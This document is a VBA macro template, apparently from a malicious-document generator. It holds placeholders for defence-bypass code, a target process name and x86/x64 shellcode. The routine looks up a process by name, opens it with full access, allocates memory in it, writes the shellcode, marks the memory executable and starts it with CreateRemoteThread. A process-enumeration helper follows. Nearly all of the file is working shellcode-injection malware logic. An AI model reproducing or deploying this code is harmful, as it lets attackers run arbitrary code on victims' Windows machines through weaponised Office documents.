{{bypassCode}}
{{moduleCode}}

Sub shellcode_inject_createremotethread()
    Dim dwErrorCode As Long
    Dim bResult As Boolean
    Dim szTargetProcessName As String
    Dim dwTargetPID As Integer
    Dim hTargetProcess As LongPtr
    Dim lpShellcode() As Byte
    Dim dwShellcodeSize As Long
    Dim lpRemoteBaseAddress As LongPtr
    Dim dwBytesWritten As LongPtr
    Dim lpflOldProtect As Long
    Dim hTargetThread As LongPtr
    Dim dwTargetThreadId As Long
    Dim bTarget32 As Long
    Dim bSource32 As Long
    
    {{bypassCalls}}
    
    {{moduleCalls}}
    
    szTargetProcessName = {{target_process}}
    If Len(szTargetProcessName) > 0 Then
        dwTargetPID = getPidByName(szTargetProcessName)
        If dwTargetPID = 0 Then
            GoTo shellcode_inject_createremotethread_Exit
        End If
        hTargetProcess = m_OpenProcess(PROCESS_ALL_ACCESS, False, dwTargetPID)
        If hTargetProcess = 0 Then
            GoTo shellcode_inject_createremotethread_Exit
        End If
    Else
        hTargetProcess = -1
    End If
        
    #If Win64 Then
        bSource32 = 0
    #Else
        bSource32 = 1
    #End If

    If Dir("C:\Windows\SysWOW64\", vbDirectory) <> "" Then
        bResult = m_IsWow64Process(hTargetProcess, bTarget32)
        If bResult = False Then
            GoTo shellcode_inject_createremotethread_Exit
        End If
    Else
        bTarget32 = 1
    End If
   
    If bSource32 = 1 And bTarget32 = 0 Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
        
    If bTarget32 = 1 Then
        lpShellcode = getShellcode_x86()
    Else
        lpShellcode = getShellcode_x64()
    End If
    
    dwShellcodeSize = UBound(lpShellcode) + 1
    
    if dwShellcodeSize < 4 Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    
    lpRemoteBaseAddress = 0
    lpRemoteBaseAddress = m_VirtualAllocEx(hTargetProcess, 0, dwShellcodeSize, MEM_COMMIT, PAGE_READWRITE)
    If lpRemoteBaseAddress = 0 Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    
    bResult = m_WriteProcessMemory(hTargetProcess, lpRemoteBaseAddress, VarPtr(lpShellcode(0)), dwShellcodeSize, dwBytesWritten)
    If bResult = False Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    If dwBytesWritten <> dwShellcodeSize Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    
    bResult = m_VirtualProtectEx(hTargetProcess, lpRemoteBaseAddress, dwShellcodeSize, PAGE_EXECUTE_READWRITE, lpflOldProtect)
    If bResult = False Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    
    hTargetThread = m_CreateRemoteThread(hTargetProcess, 0, 0, lpRemoteBaseAddress, 0, 0, dwTargetThreadId)
    If hTargetThread = 0 Then
        GoTo shellcode_inject_createremotethread_Exit
    End If
    
shellcode_inject_createremotethread_Exit:
    
    If hTargetThread <> 0 And hTargetThread <> -1 Then
        m_CloseHandle hTargetThread
    End If
    
    If hTargetProcess <> 0 And hTargetProcess <> -1 Then
        m_CloseHandle hTargetProcess
    End If
    
End Sub



Public Function getPidByName(ByVal szTargetProcessName As String) As Long
    Dim dwErrorCode As Long
    Dim pEntry As PROCESSENTRY32
    Dim bResult As Boolean
    Dim hProcessSnap As LongPtr
    Dim dwPid As Long

    dwPid = 0

    hProcessSnap = m_CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, ByVal 0&)
    If hProcessSnap = -1 Then
        GoTo getPidByName_Exit
    End If
    
    pEntry.dwSize = Len(pEntry)
    pEntry.szExeFile = ""
 
    bResult = m_Process32First(hProcessSnap, pEntry)
    If bResult = False Then
        GoTo getPidByName_Exit
    End If
 
    Do While bResult
        If LCase$(Left$(pEntry.szExeFile, Len(szTargetProcessName))) = LCase$(szTargetProcessName) Then
            dwPid = pEntry.th32ProcessID
            bResult = False
        Else
            pEntry.dwSize = Len(pEntry)
            pEntry.szExeFile = ""
            bResult = m_Process32Next(hProcessSnap, pEntry)
        End If
    Loop

getPidByName_Exit:
    
    If hProcessSnap <> 0 And hProcessSnap <> -1 Then
        m_CloseHandle hProcessSnap
    End If

    getPidByName = dwPid
    
End Function

{{shellcode_x86_func}}

{{shellcode_x64_func}}

